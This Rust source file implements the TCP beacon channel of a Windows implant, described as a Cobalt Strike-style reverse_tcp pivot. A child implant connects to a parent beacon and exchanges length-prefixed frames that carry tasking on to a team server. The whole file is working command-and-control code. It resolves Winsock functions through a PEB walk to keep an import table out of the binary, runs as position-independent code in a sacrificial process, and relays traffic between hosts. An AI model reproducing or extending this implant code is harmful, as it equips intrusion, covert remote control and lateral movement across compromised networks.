//! TCP beacon channel — reverse_tcp P2P pivot.
//!
//! Cobalt Strike-style TCP Beacon: a child implant opens a TCP connection to a
//! parent beacon (reverse_tcp). Traffic flows child → TCP → parent → HTTPS →
//! server. This module implements the child (connecting) side only; the parent
//! side is the team server / another implant's bind listener.
//!
//! Framing: 4-byte little-endian length prefix followed by the frame body, in
//! both directions. This mirrors CS's `tcp_frame_header` malleable option with a
//! fixed u32 length prefix (simplified — no magic/nonce).
//!
//! All Winsock entry points are resolved via PEB walk (no IAT). `ws2_32.dll` is
//! NOT loaded by a fresh sacrificial process, so we force-load it via
//! `LoadLibraryA` (kernel32) before resolving exports — same pattern as
//! `transport::ensure_winhttp`.
//!
//! `#![no_std]` + PIC: buffers come from `crate::heap::Vec`, FFI types are
//! `unsafe extern "system" fn` (Windows x64 ABI). IP parsing is hand-rolled so we
//! don't need `inet_addr`/`inet_pton` (one fewer export to resolve + no legacy
//! deprecated-API surface).

#![cfg(target_os = "windows")]

use crate::heap::{vec, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use super::ChannelCtx;

// ══════════════════════════════════════════════════════════════════════════════
// Winsock constants
// ══════════════════════════════════════════════════════════════════════════════

/// AF_INET — IPv4 address family.
const AF_INET: i32 = 2;
/// SOCK_STREAM — reliable byte stream (TCP).
const SOCK_STREAM: i32 = 1;
/// IPPROTO_TCP.
const IPPROTO_TCP: i32 = 6;
/// Winsock version requested by WSAStartup: 2.2 (high byte = 2, low byte = 2).
const WSA_VERSION: u16 = 0x0202;
/// WSAStartup success code.
const WSA_SUCCESS: i32 = 0;

/// Maximum response body size we'll accept from the peer (16 MiB). Caps the OOM
/// surface: a malicious peer could otherwise claim an enormous length prefix and
/// exhaust the bump allocator. Matches `transport::MAX_RESPONSE_BYTES`.
const MAX_RESPONSE_BYTES: usize = 16 * 1024 * 1024;

// ══════════════════════════════════════════════════════════════════════════════
// Winsock FFI types
// ══════════════════════════════════════════════════════════════════════════════

/// SOCKET handle. On Winsock it's a `UINT_PTR`, but we treat invalid as
/// `INVALID_SOCKET` (SOCKET_MAX). We use `usize` to stay ABI-correct on x64.
type Socket = usize;
/// Pointer-sized socket handle sentinel: (usize)-1 == INVALID_SOCKET.
const INVALID_SOCKET: Socket = usize::MAX;

/// `int (WSAAPI *LPFN_WSASTARTUP)(WORD, LPWSADATA)` → i32.
type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
/// `int (WSAAPI *LPFN_WSACLEANUP)(void)` → i32.
type FnWSACleanup = unsafe extern "system" fn() -> i32;
/// `SOCKET socket(int af, int type, int protocol)`.
type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> Socket;
/// `int connect(SOCKET s, const sockaddr *name, int namelen)`.
type FnConnect = unsafe extern "system" fn(Socket, *const SockaddrIn, i32) -> i32;
/// `int send(SOCKET s, const char *buf, int len, int flags)`.
type FnSend = unsafe extern "system" fn(Socket, *const u8, i32, i32) -> i32;
/// `int recv(SOCKET s, char *buf, int len, int flags)`.
type FnRecv = unsafe extern "system" fn(Socket, *mut u8, i32, i32) -> i32;
/// `int closesocket(SOCKET s)`.
type FnClosesocket = unsafe extern "system" fn(Socket) -> i32;

/// Resolved Winsock function table (cached after first `ensure_ws2_32`).
struct WsaFns {
    wsa_startup: FnWSAStartup,
    wsa_cleanup: FnWSACleanup,
    socket: FnSocket,
    connect: FnConnect,
    send: FnSend,
    recv: FnRecv,
    closesocket: FnClosesocket,
}

/// Winsock function table, stored as a raw pointer. 0 = uninitialized,
/// 1 = init failed, otherwise = pointer to a leaked `WsaFns`.
static WSA: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// sockaddr_in (16 bytes). sin_family is u16 on Windows (ADDRESS_FAMILY).
#[repr(C)]
struct SockaddrIn {
    sin_family: u16,
    sin_port: u16, // network byte order (big-endian)
    sin_addr: u32, // network byte order (big-endian)
    sin_zero: [u8; 8],
}

// ══════════════════════════════════════════════════════════════════════════════
// ws2_32 load + export resolution
// ══════════════════════════════════════════════════════════════════════════════

pub unsafe fn ensure_ws2_32() {
    use core::sync::atomic::Ordering;
    // Fast path: already attempted.
    let cur = WSA.load(Ordering::Acquire);
    if cur != 0 {
        return;
    }
    // Force-load ws2_32.dll via kernel32!LoadLibraryA.
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let mut ws2_32_loaded = false;
    if let Some(addr) = export_addr(b"kernel32.dll", b"LoadLibraryA") {
        let load: LoadLibraryA = core::mem::transmute(addr);
        let name = b"ws2_32.dll\0";
        let h = load(name.as_ptr());
        if !h.is_null() {
            ws2_32_loaded = true;
        }
    }
    if !ws2_32_loaded {
        let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
        return;
    }
    let wsa_startup = export_addr(b"ws2_32.dll", b"WSAStartup");
    let wsa_cleanup = export_addr(b"ws2_32.dll", b"WSACleanup");
    let socket = export_addr(b"ws2_32.dll", b"socket");
    let connect = export_addr(b"ws2_32.dll", b"connect");
    let send = export_addr(b"ws2_32.dll", b"send");
    let recv = export_addr(b"ws2_32.dll", b"recv");
    let closesocket = export_addr(b"ws2_32.dll", b"closesocket");
    if let (
        Some(wsa_startup),
        Some(wsa_cleanup),
        Some(socket),
        Some(connect),
        Some(send),
        Some(recv),
        Some(closesocket),
    ) = (wsa_startup, wsa_cleanup, socket, connect, send, recv, closesocket)
    {
        let fns = alloc::boxed::Box::new(WsaFns {
            wsa_startup: core::mem::transmute(wsa_startup),
            wsa_cleanup: core::mem::transmute(wsa_cleanup),
            socket: core::mem::transmute(socket),
            connect: core::mem::transmute(connect),
            send: core::mem::transmute(send),
            recv: core::mem::transmute(recv),
            closesocket: core::mem::transmute(closesocket),
        });
        let ptr = alloc::boxed::Box::into_raw(fns) as usize;
        match WSA.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
            Ok(_) => return,
            Err(_) => {
                drop(alloc::boxed::Box::from_raw(ptr as *mut WsaFns));
            }
        }
    } else {
        let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Helpers
// ══════════════════════════════════════════════════════════════════════════════

/// Parse a dotted-decimal IPv4 string (e.g. `"10.0.0.5"`) into a big-endian
/// `u32` in network byte order, suitable for `sockaddr_in.sin_addr`. Returns
/// `None` on malformed input. Hand-rolled so we don't need `inet_addr`/
/// `inet_pton` (one fewer export; `inet_addr` is also legacy-deprecated).
///
/// Accepts ASCII bytes (the host string is a `heap::String` of ASCII digits and
/// dots). Non-ASCII or stray characters → None.
fn parse_ipv4_be(s: &[u8]) -> Option<u32> {
    let mut octets: [u8; 4] = [0; 4];
    let mut idx = 0usize;
    let mut cur: u16 = 0;
    let mut have_digit = false;
    for &b in s {
        if b == b'.' {
            if !have_digit || idx >= 4 {
                return None;
            }
            if cur > 255 {
                return None;
            }
            octets[idx] = cur as u8;
            idx += 1;
            cur = 0;
            have_digit = false;
        } else if b.is_ascii_digit() {
            cur = cur.checked_mul(10)?.checked_add((b - b'0') as u16)?;
            have_digit = true;
        } else {
            return None;
        }
    }
    // Final octet (no trailing dot).
    if !have_digit || idx != 3 || cur > 255 {
        return None;
    }
    octets[3] = cur as u8;
    // Network byte order = big-endian: octet[0] is the most-significant byte.
    Some(u32::from_be_bytes(octets))
}

/// Send exactly `buf.len()` bytes on `s`, looping over partial `send` returns
/// (Winsock may return fewer bytes than requested). Returns true on full flush,
/// false on any error / peer close.
unsafe fn send_all(fns: &WsaFns, s: Socket, buf: &[u8]) -> bool {
    let mut sent = 0usize;
    while sent < buf.len() {
        let n = (fns.send)(
            s,
            buf.as_ptr().add(sent),
            (buf.len() - sent) as i32,
            0, // no flags
        );
        if n == 0 || n == -1 {
            return false;
        }
        sent += n as usize;
    }
    true
}

/// Receive exactly `n` bytes on `s`, looping over partial `recv` returns.
/// Returns `Some(Vec<u8>)` of length `n` on success, `None` on error / peer
/// close before `n` bytes. `n` must be > 0.
unsafe fn recv_exact(fns: &WsaFns, s: Socket, n: usize) -> Option<Vec<u8>> {
    let mut buf: Vec<u8> = vec![0u8; n];
    let mut got = 0usize;
    while got < n {
        let k = (fns.recv)(
            s,
            buf.as_mut_ptr().add(got),
            (n - got) as i32,
            0, // no flags
        );
        if k == 0 || k == -1 {
            return None;
        }
        got += k as usize;
    }
    Some(buf)
}

// ══════════════════════════════════════════════════════════════════════════════
// Public channel entry point
// ══════════════════════════════════════════════════════════════════════════════

/// Send an encrypted frame to the parent TCP beacon and return the parent's
/// response frame (or `None` on any failure).
///
/// Wire format (both directions): `[4-byte LE length][body bytes]`.
///
/// Steps:
/// 1. Validate `ctx.tcp_peer_host` / `ctx.tcp_peer_port` are configured.
/// 2. Ensure ws2_32 is loaded + exports resolved.
/// 3. `WSAStartup` (WSADATA on the stack, ~400 bytes).
/// 4. `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`.
/// 5. `connect` to the parsed IPv4 peer (reverse_tcp — outbound).
/// 6. Send `[len LE][frame]`.
/// 7. Recv `[len LE][response]`.
/// 8. `closesocket` + `WSACleanup` (always, even on error mid-stream).
///
/// Errors at any step → `None` (the beacon loop treats this as a channel failure
/// and will retry / fall back).
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    // ---- Validate configuration ----
    // Empty host or zero port ⇒ channel not configured. Distinct diag mark so a
    // misconfigured beacon is diagnosable vs. a genuinely-unimplemented channel.
    if ctx.tcp_peer_host.is_empty() || ctx.tcp_peer_port == 0 {
        crate::entry::diag_mark(b"ERR_CH_TCP_NOPEER");
        return None;
    }

    // ---- Parse peer IPv4 ----
    let sin_addr = match parse_ipv4_be(ctx.tcp_peer_host.as_bytes()) {
        Some(a) => a,
        None => {
            crate::entry::diag_mark(b"ERR_CH_TCP_BADIP");
            return None;
        }
    };
    // sin_port must be in network byte order (big-endian).
    let sin_port = ctx.tcp_peer_port.to_be();

    // ---- Resolve ws2_32 exports ----
    ensure_ws2_32();
    let ptr = WSA.load(core::sync::atomic::Ordering::Acquire);
    if ptr <= 1 {
        return None;
    }
    // SAFETY: pointer stored by ensure_ws2_32 via Box::leak; process-lifetime.
    let fns = unsafe { &*(ptr as *const WsaFns) };

    // ---- WSAStartup ----
    // WSADATA is 400 bytes on Windows; 512 on the stack is a safe upper bound
    // and avoids any allocation before winsock is initialized.
    let mut wsadata: [u8; 512] = [0u8; 512];
    if (fns.wsa_startup)(WSA_VERSION, wsadata.as_mut_ptr()) != WSA_SUCCESS {
        crate::entry::diag_mark(b"ERR_CH_TCP_WSASTARTUP");
        return None;
    }

    // Inner scope so `s` is bound and we can closesocket + WSACleanup in the
    // tail regardless of which step failed.
    let result = tcp_round(fns, sin_addr, sin_port, frame);

    // ---- Teardown (always, post-WSAStartup) ----
    (fns.wsa_cleanup)();
    result
}

/// One TCP round-trip: socket → connect → send frame → recv response. Owns the
/// socket lifecycle. Caller has already done WSAStartup and will do WSACleanup.
unsafe fn tcp_round(
    fns: &WsaFns,
    sin_addr: u32,
    sin_port: u16,
    frame: &[u8],
) -> Option<Vec<u8>> {
    // ---- socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ----
    let s = (fns.socket)(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if s == INVALID_SOCKET {
        crate::entry::diag_mark(b"ERR_CH_TCP_SOCKET");
        return None;
    }

    // Guard: ensure we closesocket on every exit path after a valid socket.
    let outcome = tcp_exchange(fns, s, sin_addr, sin_port, frame);
    (fns.closesocket)(s);
    outcome
}

/// connect → send → recv over an already-created socket. Returns None (with a
/// diag mark) on any failure; the caller closes the socket.
unsafe fn tcp_exchange(
    fns: &WsaFns,
    s: Socket,
    sin_addr: u32,
    sin_port: u16,
    frame: &[u8],
) -> Option<Vec<u8>> {
    // ---- connect ----
    let addr = SockaddrIn {
        sin_family: AF_INET as u16,
        sin_port,
        sin_addr,
        sin_zero: [0u8; 8],
    };
    if (fns.connect)(s, &addr, core::mem::size_of::<SockaddrIn>() as i32) != 0 {
        crate::entry::diag_mark(b"ERR_CH_TCP_CONNECT");
        return None;
    }

    // ---- Send length prefix (LE) + frame body ----
    let len_be: [u8; 4] = (frame.len() as u32).to_le_bytes();
    let mut wire: Vec<u8> = Vec::with_capacity(4 + frame.len());
    wire.extend_from_slice(&len_be);
    wire.extend_from_slice(frame);
    if !send_all(fns, s, &wire) {
        crate::entry::diag_mark(b"ERR_CH_TCP_SEND");
        return None;
    }

    // ---- Recv length prefix (LE) ----
    let len_buf = recv_exact(fns, s, 4)?;
    let resp_len = u32::from_le_bytes([
        len_buf[0],
        len_buf[1],
        len_buf[2],
        len_buf[3],
    ]) as usize;

    // Guard: a malicious/buggy peer could claim a huge length to exhaust the
    // bump allocator. Cap at MAX_RESPONSE_BYTES (16 MiB) and reject otherwise.
    if resp_len == 0 {
        // Legitimate empty response — no body to read. Treat as "no tasking".
        return None;
    }
    if resp_len > MAX_RESPONSE_BYTES {
        crate::entry::diag_mark(b"ERR_CH_TCP_HUGERESP");
        return None;
    }

    // ---- Recv response body ----
    let body = recv_exact(fns, s, resp_len);
    if body.is_none() {
        crate::entry::diag_mark(b"ERR_CH_TCP_RECV");
        return None;
    }
    body
}
